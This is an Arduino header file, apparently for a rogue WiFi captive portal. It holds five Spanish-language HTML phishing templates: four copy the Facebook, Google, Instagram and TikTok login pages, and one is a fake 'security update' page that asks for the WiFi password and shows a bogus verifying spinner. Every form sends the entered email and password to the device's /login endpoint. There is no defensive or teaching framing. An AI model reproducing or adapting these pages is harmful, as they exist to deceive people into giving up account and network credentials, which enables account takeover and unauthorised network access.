#ifndef PORTALS_H
#define PORTALS_H

#include <Arduino.h>

// --- PLANTILLA 1: FACEBOOK ---
const char html_facebook[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html>
<head>
<meta charset='UTF-8'>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
  body { font-family: Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #1d2129; }
  .login-container { width: 350px; background-color: white; box-shadow: 0px 0px 5px 0px rgba(0,0,0,0.20); border-radius: 5px; padding: 20px; }
  #logo { display: block; margin: 0 auto 20px; }
  h1 { font-size: 24px; font-weight: bold; margin-bottom: 10px; text-align: center; color: #1877f2; }
  h2 { font-size: 16px; font-weight: normal; color: #606770; margin-bottom: 20px; text-align: center; }
  input[type=text], input[type=password] { width: 100%; padding: 12px; margin: 5px 0 15px 0; display: inline-block; border: 1px solid #dddfe2; box-sizing: border-box; border-radius: 6px; font-size: 16px; }
  button { background-color: #1877F2; color: white; padding: 12px; margin: 10px 0; border: none; cursor: pointer; width: 100%; border-radius: 6px; font-size: 18px; font-weight: bold; }
</style>
</head>
<body>
<div class="login-container">
  <svg id="logo" viewBox="0 0 24 24" width="75" height="35" xmlns="http://www.w3.org/2000/svg">
    <path fill="#1877F2" d="M22 2H2C.9 2 0 2.9 0 4v16c0 1.1.9 2 2 2h9v-7h-3V11h3V9c0-2.8 2.2-5 5-5h3v3h-3c-1.1 0-2 .9-2 2v2h5l-1 3h-4v7h6c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"></path>
  </svg>
  <form action="/login" method="POST">
    <h1>Inicia sesi&oacute;n</h1>
    <h2>Utiliza tu cuenta de Facebook</h2>
    <input type="text" placeholder="Correo electr&oacute;nico" name="email" required>
    <input type="password" placeholder="Contrase&ntilde;a" name="password" required>
    <button type="submit">Entrar</button>
  </form>
</div>
</body>
</html>
)rawliteral";

// --- PLANTILLA 2: GOOGLE MODERN ---
const char html_google[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html>
<head>
    <meta charset='UTF-8'>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #fff; }
        .login-container { background-color: #fff; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 100%; max-width: 450px; }
        #logo { display: block; margin: 0 auto 10px; }
        h1 { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        h2 { text-align: center; font-size: 16px; font-weight: 400; margin-bottom: 30px; color: #202124; }
        .g-input { display: block; width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        .gbtn-primary { display: block; width: 100%; padding: 10px; border: none; border-radius: 4px; background-color: #1a73e8; color: #fff; cursor: pointer; font-size: 14px; font-weight: 500; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <form action="/login" method="POST">
            <div id="logo">
                <svg viewBox="0 0 75 24" width="75" height="24">
                    <g><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g>
                    <g><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g>
                    <g><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g>
                    <g><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g>
                    <g><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g>
                    <g><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g>
                </svg>
            </div>
            <h1>Inicia sesi&oacute;n</h1>
            <h2>Ir a Google</h2>
            <input name="email" type="text" class="g-input" placeholder="Correo o tel&eacute;fono" required>
            <input name="password" type="password" class="g-input" placeholder="Ingresa tu contrase&ntilde;a" required>
            <button class="gbtn-primary" type="submit">Siguiente</button>
        </form>
    </div>
</body>
</html>
)rawliteral";

// --- PLANTILLA 3: WIFI NATIVO (CON ANIMACION) ---
const char html_wifi_native[] PROGMEM = R"=====(
<!DOCTYPE html><html>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <style>
    body { font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; background-color: #f4f4f4; padding: 40px 20px; }
    .box { background: white; padding: 30px 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 320px; margin: auto; }
    h2 { color: #333; font-size: 20px; margin-bottom: 15px; }
    p { font-size: 13px; color: #666; line-height: 1.5; margin-bottom: 20px; }
    input { width: 100%; box-sizing: border-box; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; }
    button { width: 100%; padding: 12px; background: #0078d7; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
    .icon { font-size: 45px; margin-bottom: 10px; }
    
    /* Animacion de carga */
    .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; display:none; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
  <script>
    function startLoading() {
      document.getElementById('form-content').style.display = 'none';
      document.getElementById('loader-content').style.display = 'block';
    }
  </script>
</head>
<body>
  <div class='box'>
    <div id='form-content'>
        <div class='icon'>&#128274;</div>
        <h2>Actualizaci&oacute;n de Seguridad</h2>
        <p>Se requiere la clave de red para restablecer la conexi&oacute;n inal&aacute;mbrica de forma segura.</p>
        <form action='/login' method='POST' onsubmit='startLoading()'>
          <input type='hidden' name='email' value='WIFI_KEY'>
          <input type='password' name='password' placeholder='Contrase&ntilde;a de WiFi' required autofocus>
          <button type='submit'>CONECTAR</button>
        </form>
    </div>
    
    <div id='loader-content' style='display:none;'>
        <div class='loader' style='display:block;'></div>
        <h2>Verificando...</h2>
        <p>Validando clave con el punto de acceso. Por favor, no cierre esta ventana ni bloquee su dispositivo.</p>
    </div>
  </div>
</body>
</html>
)=====";


// --- PLANTILLA 4: INSTAGRAM (ICONO OFICIAL INCRUSTADO) ---
const char html_instagram[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html>
<head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .box { background: white; padding: 30px; border: 1px solid #dbdbdb; width: 350px; text-align: center; border-radius: 3px; }
  .logo-container { margin: 10px 0 25px 0; display: flex; justify-content: center; }
  input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 8px; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
  button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 8px; font-size: 14px; }
  .or-divider { color: #8e8e8e; font-size: 13px; margin: 15px 0; position: relative; }
  .forgot { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 15px; display: block; }
</style>
</head>
<body>
  <div class='box'>
    <div class="logo-container">
      <svg width="60" height="60" viewBox="0 0 448 512">
        <path fill="#262626" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
      </svg>
    </div>
    <form action='/login' method='POST'>
      <input type='text' name='email' placeholder='Teléfono, usuario o correo' required>
      <input type='password' name='password' placeholder='Contraseña' required>
      <button type='submit'>Iniciar sesión</button>
    </form>
    <div class="or-divider">O</div>
    <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
  </div>
</body>
</html>)rawliteral";


// --- PLANTILLA 5: TIKTOK ---
const char html_tiktok[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html>
<head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<style>
  body { font-family: sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .box { background: #121212; padding: 40px; border-radius: 8px; width: 350px; text-align: center; border: 1px solid #333; }
  .logo { font-size: 32px; font-weight: bold; margin-bottom: 20px; }
  input { width: 100%; background: #2f2f2f; border: 1px solid #333; color: white; padding: 12px; margin-bottom: 15px; border-radius: 4px; box-sizing: border-box; }
  button { width: 100%; background-color: #fe2c55; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; }
</style>
</head>
<body>
  <div class='box'>
    <div class='logo'>TikTok</div>
    <form action='/login' method='POST'>
      <input type='text' name='email' placeholder='Correo o usuario' required>
      <input type='password' name='password' placeholder='Contraseña' required>
      <button type='submit'>Iniciar sesión</button>
    </form>
  </div>
</body>
</html>)rawliteral";



#endif